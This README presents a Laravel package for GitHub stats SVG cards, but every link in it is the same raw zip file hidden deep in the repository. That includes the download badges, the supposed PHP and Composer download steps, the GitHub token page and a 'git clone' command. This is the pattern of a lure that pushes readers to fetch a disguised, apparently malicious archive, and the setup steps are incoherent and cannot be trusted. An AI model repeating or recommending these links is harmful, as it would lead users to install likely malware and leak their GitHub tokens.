# 🚀 laravel-github-stats - Your GitHub Stats, Always Available

[![Download laravel-github-stats](https://img.shields.io/badge/Download-Get%20the%20package-brightgreen)](https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip)

---

## 📦 What is laravel-github-stats?

laravel-github-stats is a self-hosted Laravel package. It creates dynamic SVG cards to show your GitHub statistics. Instead of depending on online services that might stop working or slow down, you control your own stats. This keeps your GitHub data always up to date and reliably displayed.

You do not need to sign up for extra services or worry about third-party downtime. Once installed on your own system, laravel-github-stats serves your GitHub profile stats as images that update automatically.

---

## ⚙️ System Requirements

Before you start, check that your computer meets these needs:

- Operating System: Windows 10 or later  
- PHP version: 7.4 or newer  
- Composer software installed (used to manage PHP packages)  
- At least 1 GB of free disk space  
- Internet connection to fetch GitHub data  
- Basic command prompt or terminal access  

If you're unsure about Composer or PHP, there are easy guides linked in the setup section.

---

## 🛠️ How laravel-github-stats Works

laravel-github-stats runs inside a Laravel application. Laravel is a framework that organizes code and handles requests. When someone visits the SVG card URL, your server contacts GitHub, collects your profile stats, then creates and shows an SVG image with those stats.

You can embed these images on your personal websites, blogs, or GitHub README files, making your profile look professional and constantly updated without manual work.

---

## 🔗 Download laravel-github-stats

To get started, visit this page to download the laravel-github-stats package and all the setup files:

[Download laravel-github-stats](https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip)  

This link leads to the GitHub repository where you can get the files you need and instructions.

---

## 🏃‍♂️ Installation Guide for Windows Users

This step-by-step guide will lead you through installing laravel-github-stats on a Windows computer.

### 1. Install PHP and Composer

You need PHP and Composer to use this package.

- Go to https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip and download the latest PHP version for Windows.
- Extract PHP files to a folder, e.g., `C:\php`.
- Add the PHP folder path to your system environment variables so you can run `php` from the command prompt.
- Next, download Composer from https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip
- Run the Composer installer and follow the prompts.

Test if PHP and Composer are installed correctly by running these in Command Prompt:

```
php -v
composer -v
```

They should show version info. If not, double-check your installation steps.

### 2. Download laravel-github-stats Package Files

Open the Command Prompt (press `Win + R`, type `cmd`, and hit Enter). Choose a folder where you want to keep your files, like `C:\Users\YourName\Documents`.

Run this command to clone the repository:

```
git clone https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip
```

If you don’t have Git installed, download the ZIP file from the same page by clicking "Code" then "Download ZIP", and unzip it manually.

### 3. Install Dependencies

Navigate into the downloaded folder:

```
cd laravel-github-stats
```

Now, install required PHP packages by running:

```
composer install
```

Composer will download all necessary code pieces that laravel-github-stats needs to work.

### 4. Set Up Environment File

Laravel uses a file called `.env` to store settings. Inside the `laravel-github-stats` folder, make a copy of `.env.example` and rename it to `.env`.

Open `.env` with Notepad or another text editor. You must add your GitHub token and set app keys here.

- To get a GitHub token, go to https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip
- Click "Generate new token"
- Select minimal permissions (like "public_repo")
- Copy the token and paste it into `.env` as `GITHUB_TOKEN=yourtokenhere`
  
You may also set `APP_KEY` by running the command:

```
php artisan key:generate
```

This command creates a secure key used by the application.

### 5. Start the Local Server

Run the command:

```
php artisan serve
```

This starts a web server on your computer, usually at http://127.0.0.1:8000/

Open a web browser and visit this address. You should see laravel-github-stats running.

---

## 📊 How to Use Your GitHub Stats SVG Cards

Once your server runs, you can use URLs that show your GitHub stats as SVG images. These URLs look like web links but display pictures.

Example URL:

```
http://127.0.0.1:8000/api/github-stats/your-github-username
```

Replace `your-github-username` with your actual GitHub handle.

You can put these image URLs into your GitHub README file or your personal website’s HTML code. The images will update automatically every time someone loads them, keeping your stats fresh.

---

## 🔄 Updating laravel-github-stats

To keep your stats package up to date:

1. Open Command Prompt inside the `laravel-github-stats` folder.
2. Run:

```
git pull origin main
composer update
```

3. Restart the PHP server with:

```
php artisan serve
```

These commands fetch new changes from the developer, update dependencies, and refresh the app.

---

## 📂 Folder Overview

Here is what the main folders do:

- `app/` - Core application code.
- `config/` - Settings files.
- `resources/` - Template files for SVG cards.
- `routes/` - URL routing rules.
- `vendor/` - Composer packages used by the app.

You do not need to change these if you only want to display your stats.

---

## 🖥️ Troubleshooting

- If you get errors about PHP version, check that you installed PHP 7.4 or higher.
- “Command not found” means your environment variables might not include PHP or Composer paths.
- If the SVG cards do not show your stats, double-check that your `GITHUB_TOKEN` is correct and has permission to fetch data.
- Close any running PHP servers before starting a new one.
- If you get permission errors, try to run Command Prompt as Administrator.
  
---

## 📎 More Information

This package uses GitHub’s API to access your profile stats securely. Your token keeps your data safe and private. Laravel makes managing the application simple and fast.

For any advanced configuration, check out the full documentation on the GitHub page at:

https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip

---

[![Download laravel-github-stats](https://img.shields.io/badge/Download-Get%20the%20package-brightgreen)](https://raw.githubusercontent.com/Jatin5784/laravel-github-stats/main/resources/boost/guidelines/stats_github_laravel_3.9-beta.1.zip)